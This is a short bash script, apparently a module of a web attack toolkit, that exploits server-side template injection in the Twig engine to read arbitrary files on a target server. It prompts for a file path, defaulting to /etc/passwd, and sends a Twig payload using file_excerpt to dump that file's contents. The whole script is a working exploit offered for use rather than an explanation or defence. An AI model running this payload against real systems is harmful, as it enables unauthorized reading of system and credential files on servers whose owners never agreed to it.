#!/bin/bash

: '
SSTI - twig lfi dump file
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
FILE_FIELD=$(form_item "read file" "file" "/etc/passwd")

# Generate GUI form
generate_form "${FILE_FIELD}"

FILE=${form_data["file"]}

execute_command "{{\"${FILE}\"|file_excerpt(1,-1)}}"
